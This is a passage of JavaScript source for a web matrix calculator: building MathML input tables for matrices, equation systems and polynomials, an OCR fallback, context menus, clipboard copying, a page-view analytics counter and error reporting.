// for layout initialization
function MatrixTableBase() {
}
MatrixTableBase.initialize = function (container, type, name) {
  var content = insertTableTemplate.cloneNode(true);
  var matrixTableInner = content.firstElementChild;
  var toolbar = content.lastElementChild;
  var placeholder = '';
  if (type === 'system') {
    //TODO: what user input coefficient matrices or systems - ?
    placeholder = '' +
      '-2x+2y-3z=0\n' +
      '-x+y-3z=0\n' +
      '2x+0y-z=0\n' +
      //'    ' + i18n.unused.other.or + '    \n' + //TODO: i18n.other.or
      '    ' + document.getElementById('i18n-or').textContent + '    \n' +
      '-2  2 -3 0\n' +
      '-1  1 -3 0\n' +
      ' 2  0 -1 0';
  } else {
    placeholder = '' +
      '-2  2 -3\n' +
      '-1  1  3\n' +
      ' 2  0 -1/3';
  }
  matrixTableInner.querySelector('textarea').placeholder = placeholder;
  container.appendChild(matrixTableInner);
  container.appendChild(toolbar);

  var setParentheses = function (open, close) {
    var updateMo = function (mo, content) {
      if (content === '') {
        mo.parentNode.removeChild(mo);
      } else {
        mo.textContent = content;
      }
    };
    var updateMrow = function (mrow, open, close) {
      updateMo(mrow.firstElementChild, open);
      updateMo(mrow.lastElementChild, close);
    };
    updateMrow(matrixTableInner.querySelector('.table-container').querySelector('mrow'), open, close);
    updateMrow(matrixTableInner.querySelector('.textarea-container').querySelector('mrow'), open, close);
  };
  if (type === 'polynomial') {
    setParentheses('', '');
  }
  if (type === 'system') {
    setParentheses('{', '');
  }

  var textarea = container.querySelector("textarea");
  var textareaName = name + "-textarea";
  textarea.id = textareaName;
  textarea.name = textareaName;

  container.classList.toggle("matrix-table", true);

};

MatrixTableBase.onKeyDown = null;
MatrixTableBase.onInput = null;

MatrixTableBase._onKeyDown = function (event) {
  MatrixTableBase.onKeyDown(event);
};
MatrixTableBase._onInput = function (event) {
  MatrixTableBase.onInput(event);
};

function addInputEventListeners(input) {
  input.addEventListener('beforeinput', MatrixTableBase._onKeyDown, false);
  input.addEventListener('keydown', MatrixTableBase._onKeyDown, false);
  input.addEventListener('input', MatrixTableBase._onInput, false);
}
/*function removeInputEventListeners(input) {
  input.removeEventListener('input', MatrixTableBase._onInput, false);
  input.removeEventListener('keydown', MatrixTableBase._onKeyDown, false);
  input.removeEventListener('beforeinput', MatrixTableBase._onKeyDown, false);
}*/
function makeNewInput(tableName, i, j) {
  var aInput = inputTemplate.firstElementChild.cloneNode(true);
  var inputName = tableName + "-" + i + "-" + j;
  var input = aInput.querySelector(".matrix-table-input");
  input.id = inputName;
  input.name = inputName;
  input.setAttribute("data-for", tableName);
  input.setAttribute("data-row", i);
  input.setAttribute("data-column", j);
  return aInput;
}

// some hacks to use native undo/redo stack in Chrome:
// TODO: https://www.grapecity.com/blogs/easy-undo-redo-for-html-forms - to make it cross browser (?)
/*var retrieveInput = function (tableName, i, j) {
  var inputName = tableName + "-" + i + "-" + j;
  var input = document.getElementById(inputName);
  if (input != null) {
    input.oninput = null;
    return input.closest('.matrix-table-cell');
  }
  return null;
};

//TODO: UNDO is broken in Chrome 106 !!! after element reattached to the DOM

var getElementStorage = function () {
  // element storage cannot be part of the matrix table container to support "undo" of the table removal
  var elementStorage = document.getElementById("matrix-table-element-storage");
  if (elementStorage == null) {
    var tmp = document.createElement("div");
    tmp.id = "matrix-table-element-storage";
    tmp.style.position = "absolute";
    tmp.style.width = "0px";
    tmp.style.height = "0px";
    tmp.style.overflow = "hidden";
    tmp.style.contain = "strict";
    document.body.appendChild(tmp);
    elementStorage = tmp;
  }
  return elementStorage;
};
var removeInputs = function (cell) {
  var input = cell.querySelector('.matrix-table-input');
  removeInputEventListeners(input);
  //updateInputValue(input, '');
  input.oninput = function (event) {
    MatrixTableBase.onInputOnRemovedInput(event);
  };
  getElementStorage().appendChild(input.closest('.matrix-table-cell'));
};*/

MatrixTableBase.onInputOnRemovedInput = null;

//TODO: !?
  function makeContent(variableName) {
    var i = variableName.indexOf("_");
    if (i === -1) {
      return '<mi>${x}</mi>'.replace(/\$\{x\}/g, variableName);
    }
    var t = '<msub><mi>${x}</mi><mn>${i}</mn></msub>';
    return t.replace(/\$\{x\}/g, variableName.slice(0, i)).replace(/\$\{i\}/g, variableName.slice(i + 1));
  }
MatrixTableBase.makeContent = makeContent;

MatrixTableBase.addMoreCells = function (tbody, type, rows, cols, tableName, variableNames) {
  var table = new Array(rows);
  var MathML = "http://www.w3.org/1998/Math/MathML";
  var row = tbody.firstElementChild;
  for (var i = 0; i < rows; i += 1) {
    table[i] = new Array(cols);
    if (row == null) {
      row = document.createElementNS(MathML, "mtr");
      tbody.appendChild(row);
    }
    row.style.display = '';
    var cell = row.firstElementChild;
    for (var j = 0; j < cols; j += 1) {
      if (cell == null) {
        cell = document.createElementNS(MathML, "mtd");
        if (type === "system" || type === "polynomial") {
          if (j > 0) {
            cell.appendChild(document.createElementNS(MathML, "mo")); // '+' or '='
            cell.firstElementChild.setAttribute('form', 'infix');
            cell.firstElementChild.textContent = '+';
          }
        }
        var inputContainer = document.createElementNS(MathML, "mi");
        cell.appendChild(inputContainer);
        var aInput = /*retrieveInput(tableName, i, j) || */makeNewInput(tableName, i, j);
        addInputEventListeners(aInput.querySelector(".matrix-table-input"));
        //Note: title is not supported on <mtd>
        aInput.title = tableName.toLowerCase() + '_(' + (i + 1) + ',' + (j + 1) + ')';//?TODO: ??? is it useful for big matrices - ?
        inputContainer.appendChild(aInput);
        if (type === "system" || type === "polynomial") {
          var mo = document.createElementNS(MathML, "mo");
          mo.innerHTML = '&it;';
          var mrow = document.createElementNS(MathML, "mrow"); // 'x_j' or ' '
          cell.appendChild(mo);
          cell.appendChild(mrow);
        }
        row.appendChild(cell);
      }
      cell.style.display = '';

      if (type === "system") {
        var cellType = i === 0 && j < cols - 1 ? 'coefficient+editable' : (i !== 0 && j < cols - 1 ? 'coefficient' : 'constant');
        var variableName = cellType !== 'constant' ? variableNames[j] : undefined;
        var cellState = cellType + ':' + variableName + ':' + j;
        if (cell.getAttribute('data-cell-state') !== cellState) { // optimization
          cell.setAttribute('data-cell-state', cellState);
          //Note: <span> is needed to set the "far" class
          if (j > 0) {
            cell.firstElementChild.textContent = (cellType !== 'constant' ? '+' : '=');
          }
          var cellHTML = (cellType === 'coefficient+editable' ? '<mi><span class="editable-on-click" data-index="${j}" data-value="${variableName}"></span></mi>'.replace(/\$\{j\}/g, j).replace(/\$\{variableName\}/g, variableName) : '') +
                           (cellType === 'coefficient' ? makeContent(variableName) : '') +
                           (cellType === 'constant' ? "<mtext>&nbsp;</mtext>" : "");
          //if (i !== 0 || cell.lastElementChild.firstElementChild == null || cell.lastElementChild.firstElementChild.getAttribute('data-value') !== variableName) {
            cell.lastElementChild.innerHTML = cellHTML;
          //}
        }
      }
      if (type === "polynomial") {
        if (j > 0) {
          cell.firstElementChild.textContent = '+';
        }
        //Note: <span> is needed to set the "far" class
        var cellHTML = (j < cols - 2 ? "<msup><mi>x</mi><mn>" + (cols - j - 1) + "</mn></msup>" : "") +
                         (j === cols - 2 ? "<mi>x</mi>" : "") +
                         (j === cols - 1 ? "<mtext>&nbsp;</mtext>" : "");
        cell.lastElementChild.innerHTML = cellHTML;
      }
      var input = cell.querySelector(".matrix-table-input");
      table[i][j] = input;
      cell = cell.nextElementSibling;
    }
    row = row.nextElementSibling;
  }
  return table;
};

MatrixTableBase.deleteExtraCells = function (tbody, type, rows, cols) {
  var clearRow = function (row, cell) {
    var c = row.lastElementChild;
    while (c !== cell) {
      //removeInputs(c);
      var previous = c.previousElementSibling;
      //c.parentNode.removeChild(c);
      c.style.display = 'none';
      c = previous;
    }
  };
  var row = tbody.firstElementChild;
  for (var i = 0; i < rows; i += 1) {
    var cell = row.firstElementChild;
    for (var j = 0; j < cols; j += 1) {
      cell = cell.nextElementSibling;
    }
    if (cell != null) {
      cell = cell.previousElementSibling;
      clearRow(row, cell);
    }
    row = row.nextElementSibling;
  }
  if (row != null) {
    row = row.previousElementSibling;
    var r = tbody.lastElementChild;
    while (r !== row) {
      clearRow(r, null);
      var previous = r.previousElementSibling;
      //r.parentNode.removeChild(r);
      r.style.display = 'none';
      r = previous;
    }
  }
};

/*document.addEventListener('DOMContentLoaded', function () {
  var es = document.querySelectorAll('.insert-table');
  for (var i = 0; i < es.length; i += 1) {
    MatrixTableBase.initialize(es[i]);
  }
}, false);*/

window.MatrixTableBase = MatrixTableBase;


}());
/*jslint plusplus: true, vars: true, indent: 2, white: true, esversion:6 */
/*global window, document, console, Node, Image, Element, Event, Dialog, Ya, PageUtils, reportValidity, fetch, initializeAInput, initializeAHighlight, initializeATooltip, MathMLToSVG, ItemsStorage, IDBItemsStorage, RPNProxy, i18n, ActHistoryItem, serializeMatrixContainer, toMultilineString, getTableFromAsciiMathMatrix, ActHistoryStorage, parseMathML, YT*/

(function () {
"use strict";

var isConnectionFast = function () {
  var connection = window.navigator.connection;
  return connection == undefined || connection.saveData !== true && !(connection.effectiveType in {"slow-2g": true, "2g": true});
};

var hasNativeTextDetector = typeof TextDetector !== 'undefined';

if (typeof TextDetector === 'undefined') {
  globalThis.TextDetector = function () {
  };
  globalThis.TextDetector.prototype.detect = function (image) {
    var pathPrefix = Utils.ROOT_PATH + 'js';
    return Utils.$import(pathPrefix + '/tesseract.js/tesseract.min.js').then(function () {
      var createWorker = Tesseract.createWorker;
      var worker = createWorker({
        workerPath: pathPrefix + '/tesseract.js/worker.min.js',
        langPath: pathPrefix + '/lang-data',
        corePath: pathPrefix + '/tesseract.js-core/tesseract-core.wasm.js',
        logger: function (m) { return console.log(m); }
      });
      return worker.load().then(function () {
        return worker.loadLanguage('eng').then(function () {
          return worker.initialize('eng').then(function () {
            var dashes = '-\u2011\u2012\u2013\u2014\u2015\u2212';
            return worker.setParameters({
              tessedit_char_whitelist: '\t 0123456789.,' + dashes,
              preserve_interword_spaces: '1',
              tessedit_pageseg_mode: '11' // PSM.SPARSE_TEXT
            }).then(function () {
              return worker.recognize(image).then(function (tmp) {
                var data = tmp.data;
                console.log(data);
                var textBlocks = [];
                for (var i = 0; i < data.lines.length; i += 1) {
                  var line = data.lines[i];
                  for (var j = 0; j < line.words.length; j += 1) {
                    var word = line.words[j];
                    textBlocks.push({
                      rawValue: word.text,
                      boundingBox: {
                        x: word.bbox.x0,
                        y: word.bbox.y0,
                        widths: word.bbox.x1 - word.bbox.x0,
                        height: word.bbox.y1 - word.bbox.y0
                      }
                    });
                  }
                }
                return textBlocks;
              });
            });
          });
        });
      });
    });
  };
}

var supportsChUnits = false;
try {
  var tmp = document.createElement('div');
  tmp.style.width = '1ch';
  supportsChUnits = tmp.style.width !== '';
  //var supportsChUnits = CSS.supports('(width: 1ch)');
} catch (error) {
  // IE 8
}

function ch(value) {
  return supportsChUnits ? value : (0.55 * Number.parseFloat(value)) + "em";
}

function isCharacterSupported(character, notSupportedCallback) {
  window.requestAnimationFrame(function () {
    // https://stackoverflow.com/a/4635712
    var tmp = document.createElement('div');
    tmp.style.position = "fixed";
    tmp.style.top = "0px"; // affects layout root in Chrome
    tmp.style.left = "0px"; // affects layout root in Chrome
    tmp.style.whiteSpace = "nowrap";
    tmp.style.width = "0px";
    tmp.style.height = "0px";
    tmp.style.overflow = "hidden";
    tmp.style.visibility = "hidden";
    tmp.style.contain = "strict";//TODO: ?
    document.body.appendChild(tmp);
    var span1 = document.createElement('span');
    span1.textContent = character;
    tmp.appendChild(span1);
    var span2 = document.createElement('span');
    span2.textContent = '\uFFFD';
    tmp.appendChild(span2);
    var value = span1.getBoundingClientRect().width !== span2.getBoundingClientRect().width;
    window.requestAnimationFrame(function () {
      tmp.parentNode.removeChild(tmp);
    });
    if (!value) {
      notSupportedCallback(value);
    }
  });
}

document.addEventListener('click', function (event) {
  // the event target is a Document somehow, and so event.target.tagName is null
  if (event.target.nodeType === Node.ELEMENT_NODE && event.target.tagName.toLowerCase() === 'a' && (event.target.getAttribute('href') || '').indexOf('//') !== -1) {
    event.target.setAttribute('rel', 'noopener');
  }
}, false);

// TODO: implement Dialog.prompt, replace button+input with button+Dialog.prompt

if (window.location.protocol !== "file:" && window.location.hostname !== "127.0.0.1" && window.navigator.doNotTrack !== "1") {
  window.setTimeout(function () {
  // LiveInternet counter
    (new Image()).src = "https://counter.yadro.ru/hit?r" + encodeURIComponent(document.referrer) + (window.screen == undefined ? "" : ";s" + Number(window.screen.width).toString() + "*" + Number(window.screen.height).toString() + "*" + "24") + ";u" + encodeURIComponent(document.URL) + ";h" + ";" + (Math.random() + 1).toString().slice(2);
  }, 256);
  /*window.setTimeout(function () {
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-JL2R5JGF6G');
    Utils.$import("https://www.googletagmanager.com/gtag/js?id=G-JL2R5JGF6G");
  }, 256);*/
}


var addClickOnEnter = function (element) {
  var input = element.querySelector('input');
  var button = element.querySelector('button');
  input.enterKeyHint = 'go'; //?  it should produce keydown events - https://groups.google.com/a/chromium.org/d/msg/blink-dev/Hfe5xktjSV8/KItGmnG_BAAJ
  input.addEventListener('keydown', function (event) {
    var DOM_VK_RETURN = 13;
    if (event.keyCode === DOM_VK_RETURN && !event.ctrlKey && !event.altKey && !event.shiftKey && !event.metaKey && !event.defaultPrevented) {
      event.preventDefault(); // in case of moving focus to some other element (textarea)
      button.click();
    }
  }, false);
};

var Utils = PageUtils;

Utils.initialize(".button-before-input", function (element) {
  addClickOnEnter(element);
});

  // ...

//TODO: remove "window."
var yaCounter = undefined;
var hitQueue = [];
var sendHits = function () {
  yaCounter.params(hitQueue);
  hitQueue = [];
};
var roundValue = function (value, max) {
  return "10**" + (Math.floor(Math.log2(Math.max(value, max) + 0.5) / Math.log2(10)) + 1);
};
var hit = function (params) {
  if (hitQueue != undefined) {
    hitQueue.push(params);
    if (yaCounter != undefined) {
      requestIdleCallback("sendHits", sendHits, 1000);
    }
  }
};
globalThis.hit = hit;//! see Polynomial#getroots

  var postError = function (error, input, initialInput, classList) {
    input = input || undefined;
    initialInput = initialInput || undefined;
    classList = classList || undefined;
    var e = function (element) {
      if (element == undefined) {
        return undefined;
      }
      var a = element.getAttribute("data-expression");
      return (element.classList || "").toString() + (a == undefined ? "" : "[data-expression=" + a + "]");
    };
    var object = {
      error: error.name + ": " + error.message,
      input: input,
      initialInput: initialInput,
      classList: classList,
      focusedElement: e(document.querySelector(":focus")),
      rounding: decimalRounding
    };
    var tables = document.querySelectorAll(".matrix-table");
    for (var i = 0; i < tables.length; i += 1) {
      var id = tables[i].getAttribute("data-id");
      var table = MatrixTables[id];
      if (table != undefined) {
        var x = table.getRawInput(table.mode);
        var value = "";
        if (typeof x !== "string") {
          var y = "";
          y += "{";
          for (var j = 0; j < x.length; j += 1) {
            y += j !== 0 ? "," : "";
            y += "{" + x[j].join(",") + "}";
          }
          y += "}";
          value = y;
        } else {
          value = x;
        }
        object[id] = value;
      }
    }
    var inputs = document.querySelectorAll("input");
    for (var k = 0; k < inputs.length; k += 1) {
      var name = inputs[k].name;
      if (name != undefined && (name.slice(0, 2) === "k-" || name === "expression")) {
        object[name] = inputs[k].value;
      }
    }
    var s = JSON.stringify(object);
    window.onerror(s, error.fileName || "", error.lineNumber || 0, error.columnNumber || 0, error);
  };

  globalThis.postError = postError;

    var handleError = function (initialInput, classList, e, positionInfo) {
      //TODO: check
      var message = e.message;
      var i = message.indexOf(":");
      var errorName = i === -1 ? message : message.slice(0, i);
      var errorDetail = i === -1 ? "" : message.slice(i + 1);

      if (errorName === "ArithmeticException") {
        Dialog.alert(getInputErrorHTML(positionInfo, i18n.errors.divisionByZeroError));//?
      } else if (errorName === "IntegerInputError") {
        var inputElementId = errorDetail;
        var inputElement = document.getElementById(inputElementId);
        reportValidity(inputElement, i18n.errors.pleaseFillOutThisField);//TODO: ?
      } else if (errorName === "NotSupportedError") {
        var text = i18n.errors.operationIsNotSupported;
        if (errorDetail === "matrixArgExpected") {
          text += "\n" + i18n.errors.matrixArgExpected;
        }
        Dialog.alert(getInputErrorHTML(positionInfo, text));//?
        postError(e, positionInfo.input, initialInput, classList);
      } else if (errorName === "UserError") {
        Dialog.alert(getInputErrorHTML(positionInfo, getInputError(e)));//?
        postError(e, positionInfo.input, initialInput, classList);
      } else if (errorName === "SingularMatrixException") {
        Dialog.alert(i18n.inverse.determinantIsEqualToZeroTheMatrixIsSingularNotInvertible);
      } else if (errorName === "MatrixDimensionMismatchException") {
        Dialog.alert(i18n.errors.matricesShouldHaveSameDimensions);
      } else if (errorName === "NonSquareMatrixException") {
        var text = errorDetail !== "" ? errorDetail : i18n.errors.matrixIsNotSquare;
        Dialog.alert(text);
      //} else if (errorName === "NonRealMatrixException") {//TODO: remove - ?
      //  Dialog.alert(i18n.CholeskyDecomposition.matrixIsNotReal);
      //} else if (errorName === "NonComplexMatrixException") {//TODO: remove - ?
      //  Dialog.alert(i18n.CholeskyDecomposition.matrixIsNotComplex);
      } else if (errorName === "NonSymmetricMatrixException") {
        Dialog.alert("<math>" + Expression.p("A=A^T").replace(/\=/g, "&ne;") + "</math>" + " â€” " + i18n.CholeskyDecomposition.theMatrixIsNotSymmetric);
      } else if (errorName === "NonHermitianMatrixException") {
        Dialog.alert("<math>" + Expression.p("A=A^{*}").replace(/\=/g, "&ne;") + "</math>" + " â€” " + i18n.CholeskyDecomposition.theMatrixIsNotHermitian);
      } else if (errorName === "DimensionMismatchException") {
        Dialog.alert(i18n.errors.theNumberOfColumnsInFirstMatrixShouldEqualTheNumberOfRowsInSecond);
      } else if (errorName === "ValueMissingError") {
        hit({error: message});//?
        var inputElementId = errorDetail;
        var inputElement = document.getElementById(inputElementId);
        reportValidity(inputElement, i18n.errors.pleaseFillOutThisField);
      } else {
        Dialog.alert(getInputErrorHTML(positionInfo, getInputError(null)));//?
        postError(e, positionInfo.input, initialInput, classList);
        window.sendSnapshot();
        //throw new TypeError(message);
        console.log(e);
      }
    };

//!
var decimalRounding = null;

/* #matrix-menu-dialog */

var getMatrixMenuShow = function (matrixContainer) {
  return matrixContainer.parentNode.querySelector(".matrix-menu-show") || matrixContainer.parentNode.parentNode.querySelector(".matrix-menu-show");
};

var showDialog = function (matrixMenu, content) {
  //!
  // as MathML elements are not focusable, move the focus to the button (Firefox + contextmenu)
  var matrixContainer = document.getElementById(matrixMenu.getAttribute("data-for-matrix"));
  if (document.activeElement === matrixContainer && document.activeElement.focus == null) {
    var focusNode = getMatrixMenuShow(matrixContainer);
    focusNode.focus();
  }
  if (document.activeElement.classList.contains("menuitem")) {
    var focusNode = getMatrixMenuShow(matrixContainer);
    focusNode.focus();
  }
  //!
  var dialog = Dialog.standard(content, "<button autofocus=\"autofocus\" type=\"submit\">" + i18n.misc.close + "</button>");
  dialog.setAttribute("dir", "ltr");
  var input = dialog.querySelector("input") || dialog.querySelector("textarea") || dialog.querySelector("img");
  if (input.tagName.toLowerCase() !== 'img') {
    input.select();
  }
  input.focus();
};

var onShowAsMenuitemClick = function (event) {
  var menuitem = event.target;
  hit({click: menuitem.id});
  var matrixMenu = menuitem.parentNode;
  var matrixContainer = document.getElementById(matrixMenu.getAttribute('data-for-matrix'));
  var content = null;
  if (menuitem.id === 'show-mathml-menuitem') {
    var value = serializeMatrixContainer(matrixContainer);
    content = '<textarea class="show-textarea" wrap="off">' + Utils.escapeHTML(value) + '</textarea>';
  } else if (menuitem.id === 'show-text-menuitem') {
    var value = matrixContainer.getAttribute('data-matrix');
    content = '<input type="text" value="${value}" />'.replace(/\$\{value\}/g, Utils.escapeHTML(value));
  } else if (menuitem.id === "show-image-menuitem") {
    var image = MathMLToSVG.drawMathMLElement(matrixContainer);
    content = '<img width="${image.width}" height="${image.height}" src="${image.src}" tabindex="0" />'
                .replace(/\$\{image\.width\}/g, image.width)
                .replace(/\$\{image\.height\}/g, image.height)
                .replace(/\$\{image\.src\}/g, image.src);
  } else if (menuitem.id === "show-latex-menuitem") {
    var value = mathmlToLaTeX(matrixContainer);
    content = '<textarea class="show-textarea" wrap="off">' + Utils.escapeHTML(value) + '</textarea>';
  }
  showDialog(matrixMenu, content, event);
};




//!
//TODO: (!) Firefox 75(?) uses "global" undo/redo stack for contenteditable=true !
//!

var insertText = function (text, input) {
  if (document.queryCommandEnabled("insertText")) {
    document.execCommand("insertText", false, text);// "undo" support
    // Note: "insertText" does not fire any events in Chrome, when the text is empty and the field is empty
  } else {
    // Firefox with <input> or <textarea>, see https://bugzilla.mozilla.org/show_bug.cgi?id=1220696
    // Mobile Safari somehow (?)
    //var input = document.activeElement; - on Mobile Safari the document.activeElement is the <body> when it should be a <textarea>
    var selectionStart = input.selectionStart;
    var selectionEnd = input.selectionEnd;
    input.setRangeText(text);
    input.setSelectionRange(selectionStart + text.length, selectionStart + text.length);
    if (text !== "" || selectionStart !== selectionEnd) { // to match Chrome's behaviour
      input.dispatchEvent(new Event('input'));
    }
  }
};


var prepareMatrixMenu = function (dataForMatrix) {
  var matrixMenu = document.getElementById("matrix-menu");
  if (matrixMenu == undefined) {
    var addMenuItem = function (id, label, onClick) {
      var node = document.createElement("menuitem");
      node.id = id;
      node.setAttribute("label", label);
      node.onclick = onClick;
      matrixMenu.appendChild(node);
    };
    matrixMenu = document.createElement('menu');
    matrixMenu.id = 'matrix-menu';
    matrixMenu.setAttribute('type', 'context');
    var tables = document.querySelectorAll(".matrix-table");
    for (var i = 0; i < tables.length; i += 1) {
      var id = tables[i].getAttribute("data-id");
      addMenuItem('print-matrix-menuitem-' + id, i18n.buttons.insertIn + ' ' + id, onPrintMatrix);
    }
    if (document.querySelector(".add-table") != null) { // not on slu.html
      var nextId = getNextTableId();
      addMenuItem('print-matrix-menuitem-' + nextId, i18n.buttons.insertInNewTable || (i18n.buttons.insertIn + ' ' + nextId), onPrintMatrixIntoNewTable);
    }
    // `document.queryCommandEnabled("copy")` returns false in Edge 17 when the selection is "collapsed"
    // `document.queryCommandEnabled("copy")` returns false, but "copy" works in Opera 12 (if allow js clipboard access)
    if (document.queryCommandSupported("copy")) {
      addMenuItem('copy-matrix-to-clipboard-menuitem', i18n.matrixMenu.copyToClipboard, onCopyMatrixToClipboard);
    }
    addMenuItem('show-mathml-menuitem', i18n.matrixMenu.showMathML, onShowAsMenuitemClick);
    addMenuItem('show-text-menuitem', i18n.matrixMenu.showText, onShowAsMenuitemClick);
    addMenuItem('show-image-menuitem', i18n.matrixMenu.showImage, onShowAsMenuitemClick);
    addMenuItem('show-latex-menuitem', i18n.matrixMenu.showLaTeX, onShowAsMenuitemClick);
    document.body.appendChild(matrixMenu);
    Utils.check(matrixMenu);
  }
  matrixMenu.setAttribute("data-for-matrix", dataForMatrix);//!
};

var initializeMenuDialog = function (menuDialog, items, trigger) {
    var focusedElements = 0;
    var closeDialog = function () {
      if (menuDialog.getAttribute("open") != undefined) {
        var focus = true;
        if (!menuDialog.contains(document.activeElement)) {
          focus = false;
        }
        menuDialog.removeAttribute("open");
        if (focus) {
          // https://github.com/whatwg/html/issues/5678
          trigger().focus();
        }
      }
    };
    var onItemFocus = function (event) {
      focusedElements += 1;
    };
    var onItemBlur = function (event) {
      focusedElements -= 1;
      window.setTimeout(function () {
        if (focusedElements === 0) {
          closeDialog();
        }
      }, 10);
    };
    var onItemClick = function (event) {
      event.preventDefault();//selection
      var i = event.target.getAttribute("data-i");
      if (i != undefined) {
        items[i].click();
      }
      closeDialog();
    };
    // https://www.w3.org/TR/wai-aria-practices-1.1/examples/listbox/js/listbox.js
    var keysSoFar = '';
    var startNode = null;
    var keyClear = 0;
    var clearKeysSoFar = function () {
      keysSoFar = '';
      startNode = null;
      keyClear = 0;
    };
    menuDialog.addEventListener("keypress", function (event) {
      if (!event.ctrlKey && !event.altKey && !event.metaKey && !event.defaultPrevented) {
        var target = document.activeElement;
        if (target.parentNode === this) {
          var s = String.fromCharCode(event.charCode).toLocaleUpperCase();
          if (startNode == null) {
            startNode = target;
          }
          keysSoFar += s;
          window.clearTimeout(keyClear);
          keyClear = window.setTimeout(clearKeysSoFar, 300);
          var node = startNode;
          for (var x = node.nextElementSibling || this.firstElementChild; x !== startNode; x = x.nextElementSibling || this.firstElementChild) {
            var label = x.textContent;
            if (keysSoFar === label.slice(0, keysSoFar.length).toLocaleUpperCase() && node === startNode) {
              node = x;
            }
          }
          if (node !== startNode) {
            event.preventDefault();
            node.focus();
          }
        }
      }
    }, false);
    menuDialog.addEventListener("keydown", function (event) {
      if (!event.ctrlKey && !event.altKey && !event.shiftKey && !event.metaKey && !event.defaultPrevented) {
        var keyCode = event.keyCode;
        var target = document.activeElement;
        if (target.parentNode === this) {
          var DOM_VK_LEFT = 37;
          var DOM_VK_UP = 38;
          var DOM_VK_RIGHT = 39;
          var DOM_VK_DOWN = 40;
          var DOM_VK_ESCAPE = 27;
          var DOM_VK_RETURN = 13;

          if (keyCode === DOM_VK_LEFT || keyCode === DOM_VK_UP) {
            var previous = target.previousElementSibling;
            if (previous == undefined) {
              previous = this.lastElementChild;
            }
            if (previous != undefined) {
              event.preventDefault();
              previous.focus();
            }
          }
          if (keyCode === DOM_VK_RIGHT || keyCode === DOM_VK_DOWN) {
            var next = target.nextElementSibling;
            if (next == undefined) {
              next = this.firstElementChild;
            }
            if (next != undefined) {
              event.preventDefault();
              next.focus();
            }
          }
          if (keyCode === DOM_VK_ESCAPE) {
            event.preventDefault();
            closeDialog();
          }
          if (keyCode === DOM_VK_RETURN) {
            event.preventDefault();
            target.click();
          }
        }
      }
    }, false);
    var elements = menuDialog.querySelectorAll(".menuitem");
    for (var k = 0; k < elements.length; k += 1) {
      elements[k].addEventListener("focus", onItemFocus, false);
      elements[k].addEventListener("blur", onItemBlur, false);
      if (items != null) {//?
        elements[k].onclick = onItemClick;
      }
    }
};

var getMatrixMenuDialog = function (matrixMenu) {
  var matrixMenuDialog = document.getElementById("matrix-menu-dialog");
  if (matrixMenuDialog == undefined) {//?
    matrixMenuDialog = document.createElement("div");
    matrixMenuDialog.id = "matrix-menu-dialog";
    matrixMenuDialog.classList.toggle("menu-dialog", true);
    matrixMenuDialog.setAttribute("role", "menu");
    var items = matrixMenu.querySelectorAll("menuitem");
    var html = "";
    for (var i = 0; i < items.length; i += 1) {
      html += "<a role=\"menuitem\" class=\"menuitem\" tabindex=\"0\" data-i=\"" + i.toString() + "\">" + items[i].getAttribute("label") + "</a>";
    }
    matrixMenuDialog.innerHTML = html;
    initializeMenuDialog(matrixMenuDialog, items, function () {
      var matrixContainer = document.getElementById(matrixMenu.getAttribute("data-for-matrix"));
      //var focusNode = matrixContainer;//TODO: fix - cannot focus MathML element
      var focusNode = getMatrixMenuShow(matrixContainer);
      return focusNode;
    });
    document.body.appendChild(matrixMenuDialog);
  }
  return matrixMenuDialog;
};

var onCopyMatrixToClipboard = function (event) {
  hit({click: "copy-matrix-to-clipboard-menuitem"});
  var matrixMenu = this.parentNode;
  var matrixContainer = document.getElementById(matrixMenu.getAttribute("data-for-matrix"));
  //var focusNode = matrixContainer;//TODO: fix - cannot focus MathML element
  var focusNode = getMatrixMenuShow(matrixContainer);
  focusNode.focus();
  window.getSelection().collapse(focusNode, 0);
  // The previous line moves the focus to the body in Edge 17
  if (document.activeElement !== focusNode) {
    focusNode.focus();
  }
  try {
    document.execCommand("copy");
  } catch (error) {
    handleError("", "", error, {});
  }
};

// button
Utils.on("click", ".matrix-menu-show", function (event) {
  hit({click: "matrix-menu-show"});
  prepareMatrixMenu(this.getAttribute("data-for-matrix"));
  var matrixMenu = document.getElementById("matrix-menu");
  var matrixMenuDialog = getMatrixMenuDialog(matrixMenu);
  var anchorRect = this.getBoundingClientRect();
  matrixMenuDialog.style.position = 'absolute';
  matrixMenuDialog.style.left = Math.min(Math.max(window.pageXOffset + anchorRect.left, 0), window.innerWidth) + 'px';
  matrixMenuDialog.style.top = (window.pageYOffset + anchorRect.bottom) + 'px';
  matrixMenuDialog.style.transformOrigin = "top left";
  matrixMenuDialog.setAttribute("open", "open");
  if (document.documentElement.dir === 'rtl') {
    matrixMenuDialog.style.left = Math.min(Math.max(window.pageXOffset + anchorRect.right - matrixMenuDialog.offsetWidth, 0), window.innerWidth) + 'px';
  }
  if (anchorRect.bottom + matrixMenuDialog.offsetHeight > window.innerHeight) {
    matrixMenuDialog.style.top = (window.pageYOffset + anchorRect.top - matrixMenuDialog.offsetHeight) + 'px';
    matrixMenuDialog.style.transformOrigin = "bottom left";
  }
  matrixMenuDialog.firstElementChild.focus();//?
});

// button
Utils.on("click", ".popup-button", function (event) {
  var menuDialog = document.getElementById(event.target.getAttribute("data-menu"));
  var popupButton = event.target;
  if (menuDialog.getAttribute("data-initialized") == null) {
    //TODO: fix

    initializeMenuDialog(menuDialog, null, function () {
      return popupButton;
    });
    menuDialog.setAttribute("data-initialized", "true");
  }
  menuDialog.setAttribute("open", "open");
  menuDialog.firstElementChild.focus();//?
});

// << Tables >>

var MatrixTables = {};

// << MatrixTable >>


//-----------------!

var getInputError = function (error) {
  if (error != null) {
    var t = null;
    var x = ' ';
    var y = ' ';
    var match = null;
    if ((match = /^UserError\: unexpected end of input, '([\s\S]+)' expected$/.exec(error.message)) != null) {
      t = i18n.errors.unexpectedEndOfInputYExpected;
      y = match[1];
    } else if ((match = /^UserError\: unexpected '([\s\S]+)', '([\s\S]+)' expected$/.exec(error.message)) != null) {
      t = i18n.errors.unexpectedXYExpected;
      x = match[1];
      y = match[2];
    } else if ((match = /^UserError\: unexpected '([\s\S]+)'$/.exec(error.message)) != null) {
      t = i18n.errors.unexpectedX;
      x = match[1];
    } else if ((match = /^UserError\: unexpected end of input$/.exec(error.message)) != null) {
      t = i18n.errors.unexpectedEndOfInput;
    } else {
      console.error(error.message);
    }
    if (t != null && t !== "") {
